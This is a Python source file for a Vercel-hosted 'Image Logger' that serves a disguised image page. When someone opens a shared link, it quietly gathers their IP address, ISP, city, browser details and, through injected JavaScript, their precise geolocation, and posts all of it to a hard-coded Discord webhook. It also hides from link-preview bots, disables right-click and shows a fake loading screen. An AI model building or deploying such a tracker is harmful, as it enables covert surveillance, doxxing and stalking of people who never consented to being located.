# Discord Image Logger Pro - Vercel Compatible
import os, traceback, requests, base64, httpagentparser, json, random, string, re, urllib.parse, time
from urllib import parse

__app__ = "Discord Image Logger Pro"
__version__ = "v3.0"

# Configuration
config = {
    "webhook": os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1408533708369301504/jlchDWD_ZBilXagHCZvGRl005WbBx2wowff5I_sQtdxvixWhostaLdItcsIjkhI1CJPr"),
    "image": os.environ.get('CUSTOM_IMAGE', "https://i.imgur.com/bI81qPe.jpeg"),
    "imageArgument": True,
    "username": "🕵️‍♂️ Image Logger Pro",
    "color": 0x7289DA,
    "accurateLocation": True,
    "disableRightClick": True,
    "disableInspect": True,
    "message": {"doMessage": False, "message": "This browser has been secured.", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://discord.com"},
    "fakeLoading": True,
    "customFavicon": "https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico"
}

blacklistedIPs = ("27", "34", "35", "104", "143", "164", "172", "192.168", "10.", "127.")

def generate_random_string(length=12):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def botCheck(ip, useragent):
    if not useragent: return False
    bot_indicators = ["bot", "crawl", "spider", "slurp", "search", "archiver"]
    if any(indicator in useragent.lower() for indicator in bot_indicators):
        return "Unknown Bot"
    if ip.startswith(("34", "35")): return "Discord"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "🚨 Image Logger - Error",
                "color": 0xFF0000,
                "description": f"```\n{error[:1500]}```"
            }]
        }, timeout=5)
    except: pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if any(ip.startswith(bl_ip) for bl_ip in blacklistedIPs): return
    
    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        try:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "🔗 Link Sent",
                    "color": 0x00FF00,
                    "description": f"**Bot:** {bot}\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`"
                }]
            }, timeout=5)
        except: pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
        if info.get('status') == 'fail': info = {}
    except:
        info = {}

    os, browser = "Unknown", "Unknown"
    if useragent:
        try: os, browser = httpagentparser.simple_detect(useragent)
        except: pass

    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "🎯 IP Logged",
            "color": config["color"],
            "description": f"""**IP:** `{ip}`
**ISP:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**Region:** `{info.get('regionName', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**Coords:** `{coords or f"{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}"}`
**OS:** `{os}`
**Browser:** `{browser}`
**User Agent:** ```{useragent[:500] if useragent else 'Unknown'}```""",
        }]
    }

    try: requests.post(config["webhook"], json=embed, timeout=10)
    except: pass

# Vercel Handler Function - THIS IS WHAT VERCEL EXPECTS
def handler(request):
    try:
        # Get client IP
        client_ip = request.headers.get('x-forwarded-for', request.headers.get('x-real-ip', '0.0.0.0'))
        user_agent = request.headers.get('user-agent', '')
        path = request.path
        query_params = request.args
        
        # Check if bot
        bot_detected = botCheck(client_ip, user_agent)
        if bot_detected:
            if config["buggedImage"]:
                return {
                    "statusCode": 200,
                    "headers": {"Content-Type": "image/jpeg"},
                    "body": base64.b64encode(b'fake_image_data').decode()
                }
            else:
                image_url = config["image"]
                if 'url' in query_params:
                    try: image_url = base64.b64decode(query_params['url']).decode()
                    except: pass
                return {
                    "statusCode": 302,
                    "headers": {"Location": image_url}
                }

        # Handle image URL
        image_url = config["image"]
        if config["imageArgument"] and 'url' in query_params:
            try: image_url = base64.b64decode(query_params['url']).decode()
            except: pass

        # Get coordinates if available
        coords = None
        if 'g' in query_params and config["accurateLocation"]:
            try: coords = base64.b64decode(query_params['g']).decode()
            except: pass

        # Make report
        makeReport(client_ip, user_agent, coords, path, image_url)

        # Generate HTML response
        html_content = generate_html_response(image_url, coords, client_ip)
        
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": html_content
        }

    except Exception as e:
        error_msg = f"Error: {str(e)}\n{traceback.format_exc()}"
        reportError(error_msg)
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/html"},
            "body": "500 - Internal Server Error"
        }

def generate_html_response(image_url, coords, client_ip):
    loading_html = ""
    if config["fakeLoading"]:
        loading_html = '''
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#111;display:flex;justify-content:center;align-items:center;z-index:1000;" id="loadingScreen">
            <div style="border:4px solid #333;border-top:4px solid #7289da;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;"></div>
        </div>
        <script>
            setTimeout(function() {
                document.getElementById('loadingScreen').style.display = 'none';
            }, 2000);
        </script>
        <style>@keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}</style>
        '''

    scripts = ""
    if config["disableRightClick"]:
        scripts += '''
        <script>document.addEventListener("contextmenu",function(e){e.preventDefault();return false;});</script>
        '''
    
    if config["accurateLocation"] and not coords:
        scripts += '''
        <script>
            setTimeout(function() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const coords = position.coords.latitude + "," + position.coords.longitude;
                        const url = new URL(window.location.href);
                        url.searchParams.set('g', btoa(coords).replace(/=/g, '%3D'));
                        window.location.href = url.toString();
                    });
                }
            }, 1000);
        </script>
        '''

    if config["message"]["doMessage"]:
        message = config["message"]["message"]
        scripts += f'''<script>setTimeout(function(){{alert("{message}");}}, 3000);</script>'''

    if config["redirect"]["redirect"]:
        scripts += f'''<script>setTimeout(function(){{window.location.href="{config["redirect"]["page"]}";}}, 4000);</script>'''

    return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Content Viewer</title>
    <link rel="icon" href="{config["customFavicon"]}" type="image/x-icon">
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
        }}
        .img {{
            background-image: url('{image_url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }}
    </style>
</head>
<body>
    {loading_html}
    <div class="img"></div>
    {scripts}
</body>
</html>'''

# Vercel requires this exact export
# This is the function that Vercel will call
def main(request):
    return handler(request)

# Export for Vercel
__all__ = ['main']
